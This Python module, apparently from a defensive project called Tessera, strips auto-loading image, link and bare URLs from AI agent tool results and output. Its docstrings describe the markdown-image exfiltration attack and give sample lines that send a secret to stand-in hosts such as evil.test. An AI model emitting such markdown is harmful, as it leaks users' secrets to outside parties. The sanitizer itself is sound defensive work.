"""Output sanitization — closing the rendered-markdown exfiltration channel.

The flow rule covers data flowing *into* tool arguments. But there is a second,
implicit channel: a tool result (or model output) rendered as markdown can
contain an image or link whose URL encodes a secret. When the client renders

    ![](https://evil.test/pixel?leak=sk-SECRET)

the browser fetches that URL — exfiltrating the secret with no tool call at
all. This is the classic markdown-image exfil.

Tessera neutralizes it by rewriting untrusted rendered content so that
auto-loading and outbound URLs are defanged: image URLs are stripped, and
links are either dropped or restricted to an operator allowlist. This is
defense for the implicit channel the charter explicitly scopes in; covert
channels through timing or side effects remain acknowledged residual risk.
"""

from __future__ import annotations

import copy
import dataclasses
import re
import sys
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Mapping
from urllib.parse import urlsplit

#: Module roots whose types cannot carry a rendered markdown URL. Used only to
#: keep the "could not inspect this" warning quiet about ``datetime``, ``UUID``,
#: ``Path`` and friends. ``sys.stdlib_module_names`` exists on 3.10+, which is
#: this package's floor.
_STDLIB_ROOTS = frozenset(getattr(sys, "stdlib_module_names", ())) | {"builtins"}

# ![alt](url "title")  -- markdown image; the dangerous one (auto-loads).
_IMAGE_RE = re.compile(r"!\[(?P<alt>[^\]]*)\]\((?P<url>[^)\s]+)(?:\s+\"[^\"]*\")?\)")
# [text](url) -- markdown link; does not auto-load but can carry a payload.
_LINK_RE = re.compile(r"(?<!\!)\[(?P<text>[^\]]*)\]\((?P<url>[^)\s]+)(?:\s+\"[^\"]*\")?\)")
# bare http(s) urls
_BARE_URL_RE = re.compile(r"https?://[^\s)>\]]+")
# raw <img ...> / markdown sometimes carries html
_HTML_IMG_RE = re.compile(r"<img\b[^>]*>", re.IGNORECASE)


@dataclass
class SanitizeResult:
    text: str
    removed: list[str] = field(default_factory=list)

    @property
    def changed(self) -> bool:
        return bool(self.removed)


def _host_allowed(url: str, allowlist: frozenset[str]) -> bool:
    if not allowlist:
        return False
    host = (urlsplit(url).hostname or "").lower()
    if not host:
        return False
    for allowed in allowlist:
        a = allowed.lower()
        if host == a or host.endswith("." + a):
            return True
    return False


def sanitize_markdown(
    text: str,
    *,
    allowlist: frozenset[str] | set[str] | None = None,
    strip_links: bool = True,
) -> SanitizeResult:
    """Defang auto-loading and outbound URLs in rendered markdown.

    Parameters
    ----------
    allowlist:
        Hostnames whose URLs are permitted to survive. Empty/None means no URL
        is allowed to auto-load. Subdomains of an allowed host are allowed.
    strip_links:
        If True, non-image links to non-allowlisted hosts have their URL
        removed (the visible text is kept). If False, links are left intact
        (images are still always defanged).

    Returns the sanitized text plus the list of URLs that were removed, so the
    proxy can record the event in the ledger.
    """
    allow = frozenset(allowlist or ())
    removed: list[str] = []

    def _image(match: re.Match[str]) -> str:
        url = match.group("url")
        if _host_allowed(url, allow):
            return match.group(0)
        removed.append(url)
        alt = match.group("alt")
        # Keep the alt text, drop the auto-loading reference entirely.
        return f"[image removed by Tessera{f': {alt}' if alt else ''}]"

    def _link(match: re.Match[str]) -> str:
        url = match.group("url")
        if _host_allowed(url, allow):
            return match.group(0)
        removed.append(url)
        text_ = match.group("text")
        return f"{text_} [link removed by Tessera]"

    def _html_img(match: re.Match[str]) -> str:
        tag = match.group(0)
        srcs = _BARE_URL_RE.findall(tag)
        for s in srcs:
            if not _host_allowed(s, allow):
                removed.append(s)
        return "[image removed by Tessera]"

    out = _HTML_IMG_RE.sub(_html_img, text)
    out = _IMAGE_RE.sub(_image, out)
    if strip_links:
        out = _LINK_RE.sub(_link, out)

    # Finally, defang any remaining bare URLs to non-allowlisted hosts so they
    # cannot be auto-linked by a permissive renderer.
    def _bare(match: re.Match[str]) -> str:
        url = match.group(0)
        if _host_allowed(url, allow):
            return url
        removed.append(url)
        return "[url removed by Tessera]"

    out = _BARE_URL_RE.sub(_bare, out)
    return SanitizeResult(text=out, removed=removed)


#: Values that can never carry a rendered URL, so are never walked or reported.
_ATOMIC = (bool, int, float, complex, bytes, bytearray, type(None))
#: Deepest object graph we will walk. Bounds pathological/hostile nesting.
_MAX_DEPTH = 16


def _walkable_fields(v: Any) -> dict[str, Any] | None:
    """Field name -> value for an object we can safely look inside, else None.

    Covers the shapes real tools actually return: dataclasses (via their field
    list, which respects ``__slots__``) and anything with a normal instance
    ``__dict__`` — which includes Pydantic models, ``SimpleNamespace``, and
    ordinary classes. Enums and classes are excluded: their identity is the
    point, and rebuilding one would be wrong even if a string inside matched.
    """
    if isinstance(v, type) or isinstance(v, Enum):
        return None
    if dataclasses.is_dataclass(v):
        return {
            f.name: getattr(v, f.name)
            for f in dataclasses.fields(v)
            if hasattr(v, f.name)
        }
    d = getattr(v, "__dict__", None)
    readable = isinstance(d, dict)
    found: dict[str, Any] = dict(d) if readable else {}
    # __slots__ classes have no instance __dict__, so vars() sees nothing. Read
    # the slot names off the MRO instead, or their strings would slip through.
    for klass in type(v).__mro__:
        declared = klass.__dict__.get("__slots__")
        if isinstance(declared, str):
            declared = (declared,)
        for name in declared or ():
            if name not in ("__dict__", "__weakref__") and hasattr(v, name):
                found.setdefault(name, getattr(v, name))
    # An empty but *readable* __dict__ means the object genuinely holds no
    # state — that is inspected-and-clean, not a gap, so don't report it.
    return found if (found or readable) else None


def _rebuild(v: Any, changes: dict[str, Any]) -> Any | None:
    """Return a copy of ``v`` with ``changes`` applied, or None if impossible.

    Never mutates the original: the caller handed us their value and may still
    hold it. Ordered most-specific first, and every strategy is attempted
    because a class can satisfy several (a Pydantic model is not a dataclass,
    but a dataclass may still define ``copy``).
    """
    # Pydantic v2. model_copy deliberately does not re-validate — a validator
    # could otherwise reject the defanged text and undo the sanitization.
    model_copy = getattr(v, "model_copy", None)
    if callable(model_copy) and hasattr(type(v), "model_fields"):
        try:
            return model_copy(update=changes)
        except Exception:  # noqa: BLE001 - any failure just means "try the next"
            pass
    # Pydantic v1.
    if hasattr(v, "__fields__"):
        v1_copy = getattr(v, "copy", None)
        if callable(v1_copy):
            try:
                return v1_copy(update=changes)
            except Exception:  # noqa: BLE001
                pass
    # Dataclasses, including frozen ones (replace goes through __init__).
    if dataclasses.is_dataclass(v) and not isinstance(v, type):
        try:
            return dataclasses.replace(v, **changes)
        except Exception:  # noqa: BLE001 - e.g. fields with init=False
            pass
    # Anything else: shallow-copy and set the changed attributes.
    try:
        clone = copy.copy(v)
        for name, val in changes.items():
            setattr(clone, name, val)
        return clone
    except Exception:  # noqa: BLE001 - frozen/slotted/immutable custom types
        return None


def _is_opaque(v: Any) -> bool:
    """True if ``v`` is a value we cannot see inside of and cannot vouch for.

    Deliberately narrow, so the warning stays a signal rather than noise:
    atomics and stdlib types (``datetime``, ``UUID``, ``Path``…) cannot carry a
    rendered markdown URL, so they are not reported. What is left is a
    third-party or C-extension object with no readable fields — the honest
    "something passed through that we could not inspect" case.
    """
    if v is None or isinstance(v, (str, *_ATOMIC, type, Enum)):
        return False
    root = (getattr(type(v), "__module__", "") or "").split(".")[0]
    return root not in _STDLIB_ROOTS


def sanitize_value(
    value: Any,
    *,
    allowlist: frozenset[str] | set[str] | None = None,
    unsanitized: list[str] | None = None,
) -> tuple[Any, list[str]]:
    """Deep-sanitize a (possibly structured) tool result, preserving shape.

    Walks containers (dict/list/tuple/set) **and typed objects** — dataclasses,
    Pydantic models, namespaces, ordinary instances — defanging every string
    leaf via :func:`sanitize_markdown`. Returns a new value of the same shape
    plus the list of removed URLs. Structure is preserved on purpose: the plan
    interpreter field-accesses structured results, so flattening them to one
    string would break that (sound) path.

    Typed objects matter because they are what real tools return (AgentDojo's
    ``Message``, most MCP client bindings). Leaving them unwalked would let
    ``![](https://evil/?leak=SECRET)`` in an object field reach rendered output,
    which is exactly the channel this module exists to close.

    Objects are **copied, never mutated** — the caller may still hold the
    original. A value is only rebuilt if sanitizing something inside it actually
    removed a URL, so an untouched result keeps its identity.

    ``unsanitized``: optional list that collects a description of every value
    that passed through *without* being sanitizable — one we could not look
    inside, or could not rebuild after sanitizing. Passing it makes the residual
    gap visible (the session records it in the ledger) instead of silent.
    Numbers/bools/None pass through.
    """
    removed: list[str] = []
    gaps = unsanitized if unsanitized is not None else []
    walking: set[int] = set()

    def note_gap(v: Any, why: str) -> None:
        label = f"{type(v).__name__} ({why})"
        if label not in gaps:
            gaps.append(label)

    def rec(v: Any, depth: int) -> Any:
        if isinstance(v, str):
            r = sanitize_markdown(v, allowlist=allowlist)
            removed.extend(r.removed)
            return r.text
        if isinstance(v, _ATOMIC) or v is None:
            return v
        if depth >= _MAX_DEPTH:
            note_gap(v, "nested deeper than Tessera walks")
            return v

        # Cycle guard: a self-referencing graph must not spin forever.
        marker = id(v)
        if marker in walking:
            return v
        walking.add(marker)
        try:
            if isinstance(v, Mapping):
                return {k: rec(x, depth + 1) for k, x in v.items()}
            if isinstance(v, list):
                return [rec(x, depth + 1) for x in v]
            if isinstance(v, tuple):
                items = [rec(x, depth + 1) for x in v]
                # Preserve a namedtuple's type; a plain tuple() would flatten it.
                if hasattr(v, "_fields"):
                    try:
                        return type(v)(*items)
                    except Exception:  # noqa: BLE001
                        pass
                return tuple(items)
            if isinstance(v, frozenset):
                return frozenset(rec(x, depth + 1) for x in v)
            if isinstance(v, set):
                return {rec(x, depth + 1) for x in v}

            fields = _walkable_fields(v)
            if fields is None:
                if _is_opaque(v):
                    note_gap(v, "no readable fields")
                return v

            # A field counts as changed iff sanitizing it removed a URL. That
            # avoids equality checks on arbitrary user types, and means an
            # untouched object is returned as-is rather than needlessly copied.
            mark = len(removed)
            changes: dict[str, Any] = {}
            for name, val in fields.items():
                before = len(removed)
                new = rec(val, depth + 1)
                if len(removed) > before:
                    changes[name] = new
            if not changes:
                return v
            rebuilt = _rebuild(v, changes)
            if rebuilt is None:
                # We are about to hand back the *original*, so every URL this
                # subtree just recorded is still in the value. Roll them back:
                # ``removed`` becomes the ledger's ``sanitize`` entry, and an
                # entry claiming a URL was stripped when it survived is worse
                # than no entry at all. The gap below is the honest record.
                # The whole range goes, not just this object's own fields —
                # returning ``v`` discards the sanitized children too.
                del removed[mark:]
                note_gap(v, "could not be rebuilt after sanitizing")
                return v
            return rebuilt
        finally:
            walking.discard(marker)

    return rec(value, 0), removed
